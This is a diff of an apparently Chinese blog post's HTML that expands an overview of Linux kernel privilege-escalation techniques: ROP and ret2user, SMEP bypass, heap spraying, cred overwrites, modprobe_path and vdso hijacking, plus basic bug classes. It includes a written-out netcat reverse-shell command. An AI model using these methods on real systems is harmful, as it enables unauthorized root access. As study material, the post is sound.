@@ -182,7 +182,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-05-12 00:20:42 / 修改时间：00:44:11" itemprop="dateCreated datePublished" datetime="2021-05-12T00:20:42+08:00">2021-05-12</time>
+              <time title="创建时间：2021-05-12 00:20:42 / 修改时间：00:49:26" itemprop="dateCreated datePublished" datetime="2021-05-12T00:20:42+08:00">2021-05-12</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -213,29 +213,160 @@
 <li><p>修改全局变量中的字符串(该字符串将直接作为run_cmd()等内核函数的参数)，执行想要执行的指令如：nc -e /bin/sh -e 127.0.0.1 1234</p>
 </li>
 <li><p>修改vdso属性为可写后，修改vdso中函数内容</p>
+</li>
+</ol>
 <h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><h3 id="一、调用commit-creds-prepare-kernel-cred-0"><a href="#一、调用commit-creds-prepare-kernel-cred-0" class="headerlink" title="一、调用commit_creds(prepare_kernel_cred(0))"></a>一、调用commit_creds(prepare_kernel_cred(0))</h3><ol>
-<li><p>ROP方式：</p>
+<li>ROP方式：</li>
+</ol>
 <p>将ROP链部署到栈上，最终调用commit_creds(prepare_kernel_cred(0))，然后切换到用户态</p>
-</li>
-<li><p>无smep，ret2user：</p>
+<ol start="2">
+<li>无smep，ret2user：</li>
+</ol>
 <p>直接劫持程序流程，跳转到用户空间指令地址，最后切换到用户态</p>
-</li>
-<li><p>有smep，关闭smep再ret2user：</p>
+<ol start="3">
+<li>有smep，关闭smep再ret2user：</li>
+</ol>
 <p>ROP修改CR4寄存器第20位为0(关闭smep), 通常使用 mov cr4, 0x6f0，最后切换到用户态</p>
-</li>
-<li><p>ret2dir：</p>
+<ol start="4">
+<li>ret2dir：</li>
+</ol>
 <p>调用mmap不断申请空间，最开始边申请边填充nop，最后填充shellcode调用commit_creds(prepare_kernel_cred(0))，然后切换回用户态</p>
-</li>
-<li><p>堆喷：</p>
+<ol start="5">
+<li>堆喷：</li>
+</ol>
 <p>针对UAF漏洞，不断调用sendmsg()或msgsnd()函数开辟堆空间并向其中填入堆喷数据，就有可能拿到漏洞程序释放的堆块并修改其中的内容</p>
 <h3 id="二、修改cred结构体"><a href="#二、修改cred结构体" class="headerlink" title="二、修改cred结构体"></a>二、修改cred结构体</h3><ol>
-<li><p>堆喷：</p>
-<p>不断调用fork()函数创建新的进程，同时也会创建新的cred结构体，</p>
-</li>
+<li>堆喷：</li>
 </ol>
-</li>
+<p>假设UAF漏洞chunk大小与cred结构体大小相同，然后不断fork子进程，同时会创建cred结构体，构造堆喷，来使得该UAF chunk被申请为cred，然后直接修改euid达到提权(直接全部填充为0)。</p>
+<ol start="2">
+<li>定位后修改：</li>
 </ol>
+<ul>
+<li><p>定位：利用任意读</p>
+<ul>
+<li><p>task_struct中存在char comm[TASK_COMM_LEN]</p>
 </li>
+<li><p>comm字符串使用prctl函数的PR_SET_NAME自行设置</p>
+</li>
+<li><p>在内存中搜索被设置后的comm字符串，cred结构体地址就在附近</p>
+</li>
+<li><p>泄漏cred结构体地址，定向覆盖cred结构体</p>
+</li>
+</ul>
+</li>
+<li><p>修改：利用任意写</p>
+<p>利用任意写漏洞改写该cred结构体为全0</p>
+</li>
+</ul>
+<h3 id="三、修改全局变量中的字符串"><a href="#三、修改全局变量中的字符串" class="headerlink" title="三、修改全局变量中的字符串"></a>三、修改全局变量中的字符串</h3><ol>
+<li>利用任意写修改poweroff_work_func内核函数参数：</li>
+</ol>
+<ul>
+<li><p>用户态执行prctl函数后触发prctl系统调用，内核接收参数后执行security_task_prctl，security_task_prctl执行hook.task_prctl，利用任意写修改hook.task_prctl值为poweroff_work_func函数地址</p>
+</li>
+<li><p>poweroff_work_func函数： 执行 run_cmd(poweroff_cmd)</p>
+</li>
+<li><p>poweroff_cmd字符串存在全局变量中，通过信息泄露或任意读找到该字符串地址</p>
+</li>
+<li><p>通过任意写修改该地址处内容</p>
+</li>
+</ul>
+<ol start="2">
+<li>利用任意写修改call_usermodehelper(char *modprobe_path …)内核函数参数：</li>
+</ol>
+<ul>
+<li><p>当用户执行错误格式的elf文件时内核会调用call_usermodehelper函数</p>
+</li>
+<li><p>call_usermodehelper函数会将第一个参数modprobe_path直接作为命令执行</p>
+</li>
+<li><p>modprobe_path字符串存在全局变量中，通过信息泄露或任意读找到该字符串地址</p>
+</li>
+<li><p>通过任意写修改该地址处内容</p>
+</li>
+</ul>
+<h3 id="四、修改vdso中函数内容"><a href="#四、修改vdso中函数内容" class="headerlink" title="四、修改vdso中函数内容"></a>四、修改vdso中函数内容</h3><p>1.定位vdso地址：</p>
+<ul>
+<li>定位内核态vdso位置：vdso中函数在第一次被调用时动态映射到内存中，其地址由加载时内存情况决定。<ul>
+<li>vdso中存在一些比较有特点的字符串，比如”gettimeofday”，在拥有任意读漏洞的前提下，从0xffffffff80000000(开启kaslr后内核基地址在此地址基础上往上偏移)开始按页搜索内存。</li>
+<li>如果内存其他地方存在”gettimeofday”字符串，且出现在vdso之前，则会返回错误地址。所以在内存搜索时，应以返回地址为起始，使用gdb dump 0x2000 内存，使用ida查看是否是vdso，如果不是，可以忽略这个错误地址，继续向下搜索。</li>
+<li>得到真正的vdso后，查看”gettimeofday”与vdso起始地址的偏移，后续匹配vdso时，加上这个偏移条件。</li>
+</ul>
+</li>
+<li>定位用户态vdso位置：<ul>
+<li>通过读取/proc/selft/maps虚拟文件内容的方式获得用户态的vdso映射地址</li>
+<li>通过调用getauxval(AT_SYSINFO_EHDR)函数获取vdso地址</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li>修改vdso属性：</li>
+</ol>
+<ul>
+<li>VDSO(Virtual Dynamic Shared Object)内存映射是用户态的一块内存映射，这使得内核空间将可以和用户态程序共享一块物理内存，从而加快执行效率，这个内存映射也叫影子内存。当在内核态修改此部分内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，分别是vdso和vsyscall。</li>
+<li>劫持程序流程(修改函数地址及最少两个参数)，调用set_memory_rw(unsigned long addr, int numpages) 内核函数修改内核vdso页面属性</li>
+<li>set_memory_rw() 函数参数addr为起始地址，numpages为作用页数。将从addr起numpages通过页标志位设置为可读写。需要注意该函数为内核函数，接收addr为内核态vdso起始地址。</li>
+<li>用户态可以直接修改vdso为shellcode，此处用到的vdso地址为用户态下vdso地址</li>
+</ul>
+<ol start="3">
+<li>内核直接修改vdso：</li>
+</ol>
+<ul>
+<li><p>利用任意地址写漏洞直接将内核态vdso中特定函数覆写为shellcode(直接反弹shell)</p>
+</li>
+<li><p>用户态高权限进程调用vdso中特定函数时，触发shellcode</p>
+</li>
+</ul>
+<h3 id="五、漏洞基础-举例"><a href="#五、漏洞基础-举例" class="headerlink" title="五、漏洞基础(举例)"></a>五、漏洞基础(举例)</h3><ol>
+<li>栈溢出：程序向栈中某变量写入的字节超过了变量本身申请的空间大小。</li>
+</ol>
+<ul>
+<li><p>漏洞原理：程序向栈中某变量写入的字节超过了变量本身申请的空间大小，覆盖了其他变量或更多。</p>
+</li>
+<li><p>利用方式：修改其他变量值；覆盖返回地址，劫持程序流程。</p>
+</li>
+</ul>
+<ol start="2">
+<li>UAF：对某一分配后指针释放后再次使用。</li>
+</ol>
+<ul>
+<li>漏洞原理：内存free时，对应指针不会清空，再次使用时该指针依然指向之前的空间。</li>
+<li>利用方式：利用堆喷覆写UAF chunk，更改程序执行流程或其他。   </li>
+</ul>
+<ol start="3">
+<li>DOUBLE FETCH：内核多次与用户交互。</li>
+</ol>
+<ul>
+<li><p>漏洞原理：从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。具体漏洞可能有多种情况：如内核与用户交互的验证操作与执行操作分离，可以由用户自己决定执行哪个操作；或者内核与用户交互的验证操作与执行操作之间存在时间间隙等。</p>
+</li>
+<li><p>利用方式：一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
+</li>
+</ul>
+<ol start="4">
+<li>SLUB ATTACK：</li>
+</ol>
+<ul>
+<li><p>漏洞原理：kmem_cache-&gt;kmem_cache_cpu-&gt;freelist管理空闲块，freelist为单链表，每个节点头部8字节存下一节点的地址。每个kmem_cache都会管理相同大小的块，块被释放后会存在freelist链表头部且分配时从头部取出，并且没有安全检查。若可以通过某种方式修改该地址，则可以实现任意读写。</p>
+</li>
+<li><p>利用方式：DOUBLE FREE:若程序存在DOUBLE FREE漏洞，在两次free同一个块后，freelist表头会成为单节点循环。我们通过多次调用kmalloc(堆喷)申请与DOUBLE FREE chunk相同大小的块。就会获得之前的DOUBLE FREE chunk，修改获得块的头部8个字节为target_addr，调用malloc获得DOUBLE FREE chunk，再次调用malloc就可以获得target块，就可以实现任意写，进而也可能实现任意读。</p>
+</li>
+</ul>
+<ol start="5">
+<li>整数溢出：</li>
+</ol>
+<ul>
+<li>漏洞原理：当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。</li>
+<li>利用方式：上界溢出与下界溢出。无符号数和有符号数比较。</li>
+</ul>
+<ol start="6">
+<li>条件竞争：</li>
+</ol>
+<ul>
+<li>漏洞原理：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。</li>
+<li>利用方式：dirty cow就是一个典型内核态条件竞争漏洞，详细可见dirty cow漏洞原理。</li>
+</ul>
+<ol start="7">
+<li>具体情况具体分析= =。。</li>
 </ol>
 
       
